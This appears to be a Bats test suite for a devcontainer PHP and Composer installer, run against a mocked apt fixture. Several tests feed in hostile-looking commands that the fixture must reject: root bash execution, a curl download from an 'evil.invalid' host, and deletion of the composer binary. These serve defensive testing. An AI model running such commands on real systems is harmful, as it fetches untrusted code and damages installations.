#!/usr/bin/env bats

load ../helpers/apt-fixture.bash
load ../helpers/argv-assertions.bash

setup() {
    setup_apt_fixture "${BATS_TEST_TMPDIR}/php"
    mkdir -p "${APT_FIXTURE_ROOT}/install/available" "${APT_FIXTURE_ROOT}/install/lib"
    INSTALLER="${APT_FIXTURE_ROOT}/install/available/2300-php-lang.sh"
    cp "${BATS_TEST_DIRNAME}/../../install/available/2300-php-lang.sh" "$INSTALLER"
    cmp "${BATS_TEST_DIRNAME}/../../install/available/2300-php-lang.sh" "$INSTALLER"
    CONSUMER="${APT_FIXTURE_ROOT}/install/lib/common.sh"
    cp "${BATS_TEST_DIRNAME}/../helpers/apt-php-consumer.bash" "$CONSUMER"
}

run_php_fixture() {
    run_apt_fixture "$1" "$CONSUMER" EXISTING="${EXISTING:-0}" \
        COMPOSER_EXISTING="${COMPOSER_EXISTING:-0}" FAIL_STAGE="${FAIL_STAGE:-0}" \
        PHP_PROBE_STATUS="${PHP_PROBE_STATUS:-0}" COMPOSER_PROBE_STATUS="${COMPOSER_PROBE_STATUS:-0}" \
        POLICY_STATUS="${POLICY_STATUS:-0}" MISSING_LOCK="${MISSING_LOCK:-0}" \
        EXPECT_SERIES="${EXPECT_SERIES:-8.4}" PPA_STATUS="${PPA_STATUS:-0}" "${@:2}"
}

@test "PHP rejects arbitrary root scripts without execution or capture" {
    printf 'devcontainer_run_as_root /bin/bash -c '\''touch "%s/hostile"'\''\n' "$APT_FIXTURE_ROOT" >"${APT_FIXTURE_ROOT}/probe"
    run_php_fixture "${APT_FIXTURE_ROOT}/probe"
    [ "$status" -eq 98 ]
    [ ! -e "${APT_FIXTURE_ROOT}/hostile" ]
    [ ! -e "${APT_FIXTURE_ROOT}/root-1" ]
}

reset_php_calls() {
    rm -f "${APT_FIXTURE_ROOT}"/root-* "${APT_FIXTURE_ROOT}"/stage-* \
        "${APT_FIXTURE_CALLS}"/* "${APT_FIXTURE_ROOT}"/{ppa,download,cleanup,probes} \
        "${APT_FIXTURE_ROOT}/tmp/composer-setup.php"
}

assert_php_install() {
    local series=$1
    [ "$status" -eq 0 ]
    assert_recorded_argv "${APT_FIXTURE_CALLS}/1" update -qq
    assert_recorded_argv "${APT_FIXTURE_CALLS}/2" install -y --no-install-recommends software-properties-common
    assert_recorded_argv "${APT_FIXTURE_CALLS}/3" update -qq
    assert_recorded_argv "${APT_FIXTURE_CALLS}/4" install -y --no-install-recommends \
        "php${series}-cli" "php${series}-curl" "php${series}-mbstring" "php${series}-xml" "php${series}-zip"
    assert_recorded_argv "${APT_FIXTURE_ROOT}/root-1" apt-get update -qq
    assert_recorded_argv "${APT_FIXTURE_ROOT}/root-2" apt-get install -y --no-install-recommends software-properties-common
    assert_recorded_argv "${APT_FIXTURE_ROOT}/root-4" apt-get update -qq
    assert_recorded_argv "${APT_FIXTURE_ROOT}/root-5" apt-get install -y --no-install-recommends \
        "php${series}-cli" "php${series}-curl" "php${series}-mbstring" "php${series}-xml" "php${series}-zip"
    assert_recorded_argv "${APT_FIXTURE_ROOT}/ppa" -y ppa:ondrej/php
    assert_recorded_argv "${APT_FIXTURE_ROOT}/download" -fsSL -o /tmp/composer-setup.php https://getcomposer.org/installer
    assert_recorded_argv "${APT_FIXTURE_ROOT}/root-7" php /tmp/composer-setup.php -- --install-dir=/usr/local/bin --filename=composer
    assert_recorded_argv "${APT_FIXTURE_ROOT}/cleanup" -f /tmp/composer-setup.php
    [ ! -e "${APT_FIXTURE_CALLS}/5" ]
    [ ! -e "${APT_FIXTURE_ROOT}/tmp/composer-setup.php" ]
    [ ! -e "${APT_FIXTURE_ROOT}/download-executed" ]
    [ "$(<"${APT_FIXTURE_ROOT}/probes")" = $'php\ncomposer' ]
    [[ "$output" = *$'php PHP fixture, composer Composer fixture' ]]
    [[ "$output" != *ignored* ]]
}

@test "PHP default series records two update cycles five packages and inert Composer install" {
    run_php_fixture "$INSTALLER"
    assert_php_install 8.4
}

@test "PHP explicit series overrides lock and existing Composer does not skip bootstrap" {
    EXPECT_SERIES=8.3 COMPOSER_EXISTING=1 run_php_fixture "$INSTALLER" PHP_VERSION=8.3
    assert_php_install 8.3
}

@test "PHP reuse ignores Composer absence and series mismatch with zero installation requests" {
    local composer
    for composer in 0 1; do
        EXISTING=1 COMPOSER_EXISTING="$composer" run_php_fixture "$INSTALLER" PHP_VERSION=9.9
        [ "$status" -eq 0 ]
        [ "$output" = 'php already installed: PHP fixture' ]
        [ "$(<"${APT_FIXTURE_ROOT}/probes")" = php ]
        [ ! -e "${APT_FIXTURE_CALLS}/1" ]
        [ ! -e "${APT_FIXTURE_ROOT}/root-1" ]
        [ ! -e "${APT_FIXTURE_ROOT}/download" ]
        reset_php_calls
    done
}

@test "PHP policy failure and missing lock stop before reuse or requests" {
    POLICY_STATUS=51 EXISTING=1 run_php_fixture "$INSTALLER"
    [ "$status" -eq 51 ]
    [ ! -e "${APT_FIXTURE_ROOT}/probes" ]
    MISSING_LOCK=1 EXISTING=1 run_php_fixture "$INSTALLER"
    [ "$status" -eq 1 ]
    [[ "$output" = *'missing LOCK_PHP_SERIES'* ]]
    [ ! -e "${APT_FIXTURE_CALLS}/1" ]
    [ ! -e "${APT_FIXTURE_ROOT}/probes" ]
}

@test "PHP explicit version works without lock and print policy exits without install" {
    printf '#!/bin/bash\nexec /bin/bash "%s" --print-version-policy\n' "$INSTALLER" >"${APT_FIXTURE_ROOT}/probe"
    # The wrapper is trusted local test code; it executes only the byte-equal copy.
    MISSING_LOCK=1 run_php_fixture "${APT_FIXTURE_ROOT}/probe" PHP_VERSION=8.2
    [ "$status" -eq 0 ]
    [ "$output" = 'PHP_VERSION=8.2' ]
    [ ! -e "${APT_FIXTURE_CALLS}/1" ]
    [ ! -e "${APT_FIXTURE_ROOT}/probes" ]
}

@test "PHP APT download and root Composer failures preserve status and stop later stages" {
    local stage
    for stage in 1 2 4 5 6 7; do
        FAIL_STAGE="$stage" run_php_fixture "$INSTALLER"
        [ "$status" -eq "$((40+stage))" ]
        [ ! -e "${APT_FIXTURE_ROOT}/stage-${stage}" ]
        [ ! -e "${APT_FIXTURE_ROOT}/stage-$((stage+1))" ]
        [ ! -e "${APT_FIXTURE_ROOT}/probes" ]
        [ ! -e "${APT_FIXTURE_ROOT}/cleanup" ]
        [[ "$output" != *'php PHP fixture, composer'* ]]
        if [ "$stage" -eq 7 ]; then
            [ "$(<"${APT_FIXTURE_ROOT}/tmp/composer-setup.php")" = ': >"${APT_FIXTURE_ROOT}/download-executed"' ]
        fi
        [ ! -e "${APT_FIXTURE_ROOT}/download-executed" ]
        reset_php_calls
    done
}

@test "PHP deliberately tolerates failed or missing PPA command and continues" {
    local failure
    for failure in 43 127; do
        PPA_STATUS="$failure" run_php_fixture "$INSTALLER"
        assert_php_install 8.4
        printf 'PHP_STAGE=2\nadd-apt-repository -y ppa:ondrej/php\n' >"${APT_FIXTURE_ROOT}/probe"
        PPA_STATUS="$failure" run_php_fixture "${APT_FIXTURE_ROOT}/probe"
        [ "$status" -eq "$failure" ]
        reset_php_calls
    done
}

@test "PHP swallows failed and missing PHP and Composer probes with direct status proof" {
    local failure command existing
    for failure in 53 127; do
        for command in php composer; do
            for existing in 0 1; do
                if [ "$command" = php ]; then
                    EXISTING="$existing" PHP_PROBE_STATUS="$failure" run_php_fixture "$INSTALLER"
                else
                    EXISTING="$existing" COMPOSER_PROBE_STATUS="$failure" run_php_fixture "$INSTALLER"
                fi
                [ "$status" -eq 0 ]
                printf '%s --version\n' "$command" >"${APT_FIXTURE_ROOT}/probe"
                PHP_PROBE_STATUS="$failure" COMPOSER_PROBE_STATUS="$failure" run_php_fixture "${APT_FIXTURE_ROOT}/probe"
                [ "$status" -eq "$failure" ]
                reset_php_calls
            done
        done
    done
}

@test "PHP rejects unknown command vectors paths ordering and arbitrary script operands" {
    local request
    for request in 'devcontainer_run_as_root' 'devcontainer_run_as_root sudo apt-get update -qq' \
        'devcontainer_run_as_root apt-get update' 'devcontainer_run_as_root apt-get update -qq extra' \
        'devcontainer_run_as_root apt-get install -y --no-install-recommends php8.4-cli' \
        'curl -fsSL -o /tmp/other https://getcomposer.org/installer' \
        'PHP_STAGE=5; curl -fsSL -o /tmp/composer-setup.php https://evil.invalid' \
        'rm -f /tmp/composer-setup.php' 'PHP_STAGE=7; rm -f /usr/local/bin/composer' \
        'PHP_STAGE=7; rm -f /tmp/composer-setup.php extra' \
        'PHP_STAGE=6; devcontainer_run_as_root php /tmp/other -- --install-dir=/usr/local/bin --filename=composer' \
        'PHP_STAGE=6; devcontainer_run_as_root /usr/bin/php /tmp/composer-setup.php' \
        'PHP_STAGE=6; devcontainer_run_as_root php /tmp/composer-setup.php -- --install-dir=/tmp --filename=composer' \
        'devcontainer_fetch https://getcomposer.org/installer /tmp/other' \
        'php /tmp/composer-setup.php' 'composer install' 'head -2' 'devcontainer_has_cmd composer' \
        'add-apt-repository -y ppa:ondrej/php'; do
        printf '%s\n' "$request" >"${APT_FIXTURE_ROOT}/probe"
        run_php_fixture "${APT_FIXTURE_ROOT}/probe"
        [ "$status" -eq 98 ]
        [ ! -e "${APT_FIXTURE_ROOT}/download" ]
        [ ! -e "${APT_FIXTURE_ROOT}/cleanup" ]
        [ ! -e "${APT_FIXTURE_ROOT}/root-1" ]
        [ ! -e "${APT_FIXTURE_ROOT}/root-7" ]
    done
}

@test "PHP closed PATH exposes no executable mutation or downloaded-code fallback" {
    local command
    for command in php composer curl rm add-apt-repository bash docker python3; do
        printf 'type -P %s\n' "$command" >"${APT_FIXTURE_ROOT}/probe"
        run_php_fixture "${APT_FIXTURE_ROOT}/probe"
        [ "$status" -eq 1 ]
    done
}
